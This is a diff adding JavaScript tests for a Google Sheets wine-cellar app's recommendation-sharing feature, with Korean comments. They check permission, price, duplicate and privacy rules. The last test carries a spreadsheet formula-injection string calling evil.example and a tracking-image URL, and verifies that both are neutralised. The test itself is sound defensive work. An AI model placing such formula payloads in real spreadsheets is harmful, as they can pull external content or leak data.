@@ -515,4 +515,165 @@ test('AI 정보 채우기: 기다리는 사이 행이 바뀌면 안 쓰고, 수�
   assert.strictEqual(JSON.stringify(sheet.rows[2]), before.replace('샤토 B', '바뀐 와인'), '바뀐 행에 AI 값을 안 씀');
 });
 
+test('와인 추천: 마신 와인만 올라가고, 다른 셀러에게 보이며, 와인 시트는 구매가격 빈칸 말고 그대로', () => {
+  const env = makeEnv({ sheets: oldSheets() });
+  const kim = setupUser(env, 'kim', '1234');
+  const lee = setupUser(env, 'lee', '5678');
+  const wineSheet = env.ss.sheets[0];
+  // 보유 중인 와인·남의 와인·행이 밀린 경우는 거절
+  assert(/마신 와인만/.test(env.call('recommendWine', { token: kim, row: 2, comment: 'x', price: '1000', expectedName: '샤토 A' }).error));
+  assert(/내 와인이 아니에요/.test(env.call('recommendWine', { token: kim, row: 4, comment: 'x', price: '1000' }).error));
+  assert(/새로고침/.test(env.call('recommendWine', { token: kim, row: 3, comment: 'x', price: '1000' }).error), '와인명 확인 필수');
+  assert(/목록이 바뀌었어요/.test(env.call('recommendWine', { token: kim, row: 3, comment: 'x', price: '1000', expectedName: '샤토 A' }).error));
+  const wineBefore = JSON.parse(JSON.stringify(wineSheet.rows));
+  let r = env.call('recommendWine', { token: kim, row: 3, comment: '산뜻해요', price: '38,000원', expectedName: '샤토 B' });
+  assert(r.ok && !r.addedTo && !r.again, JSON.stringify(r));
+  assert.strictEqual(r.price, '38000');
+  const priceCol = wineSheet.rows[0].indexOf('구매가격');
+  assert.strictEqual(wineSheet.rows[2][priceCol], '38000', '비어 있던 구매가격은 와인에도 저장');
+  wineSheet.rows.forEach((row, i) => row.forEach((v, j) => {
+    if (i === 2 && j === priceCol) return;
+    assert.deepStrictEqual(v, (wineBefore[i] || [])[j] === undefined ? v : wineBefore[i][j], (i + 1) + '행 ' + (j + 1) + '칸 유지');
+  }));
+  const list = env.call('getRecommendations', { token: lee });
+  assert.strictEqual(list.length, 1);
+  assert.strictEqual(list[0]['와인명'], '샤토 B');
+  assert.strictEqual(list[0]['추천글'], '산뜻해요');
+  assert.strictEqual(list[0]['구매가격'], '38000');
+  assert.strictEqual(list[0]['평점'], 4);
+  assert.strictEqual(list[0]['추천인이름'], 'kim');
+  assert.strictEqual(list[0].mine, false);
+  assert.strictEqual(list[0].canCancel, false);
+  assert.strictEqual(env.call('getRecommendations', { token: kim })[0].mine, true);
+});
+
+test('추천에는 구매가격이 꼭 있어야 하고, 선물받음도 되며, 있던 구매가격은 덮어쓰지 않는다', () => {
+  const env = makeEnv({ sheets: oldSheets() });
+  const kim = setupUser(env, 'kim', '1234');
+  const wineSheet = env.ss.sheets[0];
+  const recCount = () => (env.ss.getSheetByName('추천공유') || { getLastRow: () => 1 }).getLastRow() - 1;
+  let r = env.call('recommendWine', { token: kim, row: 3, comment: 'x', expectedName: '샤토 B' });
+  assert(r.needPrice && /구매가격/.test(r.error), JSON.stringify(r));
+  r = env.call('recommendWine', { token: kim, row: 3, comment: 'x', price: '비쌈', expectedName: '샤토 B' });
+  assert(r.needPrice, JSON.stringify(r));
+  r = env.call('recommendWine', { token: kim, row: 3, comment: 'x', price: '0', expectedName: '샤토 B' });
+  assert(r.needPrice, JSON.stringify(r));
+  assert.strictEqual(recCount(), 0, '거절되면 아무것도 안 올라감');
+  r = env.call('recommendWine', { token: kim, row: 3, comment: 'x', price: '선물 받음', expectedName: '샤토 B' });
+  assert(r.ok && r.price === '선물받음', JSON.stringify(r));
+  const priceCol = wineSheet.rows[0].indexOf('구매가격') + 1;
+  assert.strictEqual(wineSheet.get(3, priceCol), '선물받음');
+  // 와인에 이미 구매가격이 있으면 다른 값으로 추천해도 와인 쪽은 그대로
+  wineSheet.set(3, priceCol, 50000);
+  r = env.call('recommendWine', { token: kim, row: 3, comment: 'y', price: '45000', expectedName: '샤토 B', again: true });
+  assert(r.ok && !r.savedPriceToWine, JSON.stringify(r));
+  assert.strictEqual(wineSheet.get(3, priceCol), 50000);
+  // 예전 화면(가격을 안 보냄)이면 와인에 적힌 구매가격을 쓴다
+  r = env.call('recommendWine', { token: kim, row: 3, comment: 'z', expectedName: '샤토 B', again: true });
+  assert(r.ok && r.price === '50000', JSON.stringify(r));
+});
+
+test('같은 와인을 다시 추천하면 이미 추천했다고 알려주고, 확인하면 덮어쓰지 않고 추가 추천으로 붙는다', () => {
+  const env = makeEnv({ sheets: oldSheets() });
+  const kim = setupUser(env, 'kim', '1234');
+  const lee = setupUser(env, 'lee', '5678');
+  const wineSheet = env.ss.sheets[0];
+  assert(env.call('recommendWine', { token: kim, row: 3, comment: '처음', price: '30000', expectedName: '샤토 B' }).ok);
+  const recSheet = env.ss.getSheetByName('추천공유');
+  const firstRow = recSheet.rows[1].slice();
+  let r = env.call('recommendWine', { token: kim, row: 3, comment: '두번째', price: '30000', expectedName: '샤토 B' });
+  assert(r.alreadyRecommended && /이미 추천한/.test(r.error) && r.count === 1, JSON.stringify(r));
+  assert.strictEqual(recSheet.getLastRow(), 2, '확인 전에는 새 줄 없음');
+  r = env.call('recommendWine', { token: kim, row: 3, comment: '두번째', price: '30000', expectedName: '샤토 B', again: true });
+  assert(r.ok && r.again && r.addedTo, JSON.stringify(r));
+  assert.strictEqual(recSheet.getLastRow(), 3);
+  assert.deepStrictEqual(recSheet.rows[1], firstRow, '처음 추천은 그대로');
+  // 다른 사람이 같은 와인(이름 대소문자·공백만 다름, 같은 빈티지)을 추천하면 같은 묶음
+  wineSheet.set(4, 1, ' 샤토  b ');
+  env.call('markDrunk', { token: lee, row: 4, info: { '평점': 5 }, expectedName: ' 샤토  b ' });
+  wineSheet.set(4, 4, '2020');
+  r = env.call('recommendWine', { token: lee, row: 4, comment: '저도요', price: '선물받음', expectedName: ' 샤토  b ' });
+  assert(r.ok && r.addedTo && !r.again, JSON.stringify(r));
+  const list = env.call('getRecommendations', { token: lee });
+  assert.strictEqual(list.length, 3);
+  assert.strictEqual(new Set(list.map(x => x['묶음키'])).size, 1, '한 게시글로 묶임');
+  assert.deepStrictEqual(list.map(x => x['추천글']).sort(), ['두번째', '저도요', '처음'].sort());
+});
+
+test('추천 취소는 행을 지우지 않고, 내 추천만 취소할 수 있다', () => {
+  const env = makeEnv({ sheets: oldSheets() });
+  const kim = setupUser(env, 'kim', '1234');
+  const lee = setupUser(env, 'lee', '5678');
+  const rec = env.call('recommendWine', { token: kim, row: 3, comment: '굿', price: '20000', expectedName: '샤토 B' });
+  assert(/내 추천이 아니에요/.test(env.call('cancelRecommendation', { token: lee, row: rec.rowIndex, expectedName: '샤토 B' }).error));
+  assert(/목록이 바뀌었어요/.test(env.call('cancelRecommendation', { token: kim, row: rec.rowIndex }).error), '와인명 확인 필수');
+  assert(/목록이 바뀌었어요/.test(env.call('cancelRecommendation', { token: kim, row: rec.rowIndex, expectedName: '샤토 A' }).error));
+  assert(env.call('cancelRecommendation', { token: kim, row: rec.rowIndex, expectedName: '샤토 B' }).ok);
+  const recSheet = env.ss.getSheetByName('추천공유');
+  assert.strictEqual(recSheet.getLastRow(), 2, '행은 남는다');
+  assert.strictEqual(recSheet.get(2, 5), '샤토 B');
+  assert.strictEqual(recSheet.get(2, 13), '취소됨');
+  assert.strictEqual(env.call('getRecommendations', { token: lee }).length, 0);
+  // 취소한 뒤 다시 추천하면 새로 올라간다
+  assert(env.call('recommendWine', { token: kim, row: 3, comment: '다시', price: '20000', expectedName: '샤토 B' }).ok);
+  assert.strictEqual(env.call('getRecommendations', { token: lee }).length, 1);
+});
+
+test('추천한 와인을 휴지통에 넣으면 추천도 숨고, 되살리면 다시 보인다', () => {
+  const env = makeEnv({ sheets: oldSheets() });
+  const kim = setupUser(env, 'kim', '1234');
+  const lee = setupUser(env, 'lee', '5678');
+  env.call('recommendWine', { token: kim, row: 3, comment: '굿', price: '20000', expectedName: '샤토 B' });
+  env.call('deleteWine', { token: kim, row: 3, expectedName: '샤토 B' });
+  assert.strictEqual(env.call('getRecommendations', { token: lee }).length, 0);
+  env.call('restoreWine', { token: kim, row: 3, expectedName: '샤토 B' });
+  assert.strictEqual(env.call('getRecommendations', { token: lee }).length, 1);
+});
+
+test('추천 시트 칸 제목이 예상과 다르면 덮어쓰지 않는다', () => {
+  const sheets = oldSheets();
+  sheets.push(new FakeSheet('추천공유', [['추천일', '손으로 적은 제목']]));
+  const env = makeEnv({ sheets });
+  const kim = setupUser(env, 'kim', '1234');
+  const r = env.call('getRecommendations', { token: kim });
+  assert(/덮어쓰지 않고 멈췄어요/.test(r.error), JSON.stringify(r));
+  assert.strictEqual(sheets[1].rows[0][1], '손으로 적은 제목');
+});
+
+test('계정 삭제 때는 그 사람의 추천만 지우고 다른 사람 추천은 그대로', () => {
+  const env = makeEnv({ sheets: oldSheets() });
+  const admin = setupUser(env, 'dkmk', '0000');
+  const kim = setupUser(env, 'kim', '1234');
+  const lee = setupUser(env, 'lee', '5678');
+  env.call('markDrunk', { token: lee, row: 4, info: { '평점': 5 }, expectedName: '남의 와인' });
+  env.call('recommendWine', { token: kim, row: 3, comment: 'k', price: '1', expectedName: '샤토 B' });
+  env.call('recommendWine', { token: lee, row: 4, comment: 'l', price: '선물받음', expectedName: '남의 와인' });
+  assert(env.call('deleteUserAccount', { token: admin, id: 'kim' }).ok);
+  const list = env.call('getRecommendations', { token: admin });
+  assert.deepStrictEqual(list.map(x => x['와인명']), ['남의 와인']);
+  assert.strictEqual(list[0].canCancel, true, '관리자는 내릴 수 있음');
+});
+
+test('추천: 다른 셀러의 개인 정보(메모·구매처·와인 행·아이디)는 내려가지 않고, 추천글은 수식으로 실행되지 않는다', () => {
+  const env = makeEnv({ sheets: oldSheets() });
+  const kim = setupUser(env, 'kim', '1234');
+  const lee = setupUser(env, 'lee', '5678');
+  const ws = env.ss.sheets[0];
+  const h = ws.rows[0];
+  const set = (name, v) => { let c = h.indexOf(name); if (c === -1) { h.push(name); c = h.length - 1; } ws.set(3, c + 1, v); };
+  set('메모', '비밀 메모'); set('구매처', '동네 와인샵'); set('라벨사진', 'https://evil.example/track.png');
+  const r = env.call('recommendWine', { token: kim, row: 3, comment: '=IMPORTXML("https://evil.example","//a")', price: '1000', expectedName: '샤토 B' });
+  assert(r.ok, JSON.stringify(r));
+  const recSheet = env.ss.getSheetByName('추천공유');
+  assert.deepStrictEqual(recSheet.formulas, {}, '추천 시트에 수식이 생기지 않음');
+  const x = env.call('getRecommendations', { token: lee })[0];
+  const text = JSON.stringify(x);
+  assert(!/비밀 메모|동네 와인샵/.test(text), '메모·구매처는 안 내려감');
+  assert(!/"kim"/.test(JSON.stringify(Object.assign({}, x, { '추천인이름': '' }))), '아이디는 안 내려감');
+  assert.strictEqual(x['와인행'], '', '남의 와인 행 번호는 안 내려감');
+  assert.strictEqual(x['라벨사진'], '', '외부 주소 사진은 안 보여줌');
+  // lee의 와인 목록에는 kim의 와인이 섞이지 않는다
+  assert(env.call('getWines', { token: lee }).wines.every(w => w['소유자'] === 'lee'));
+});
+
 console.log(passed + '개 통과' + (process.exitCode ? ' (실패 있음)' : ''));
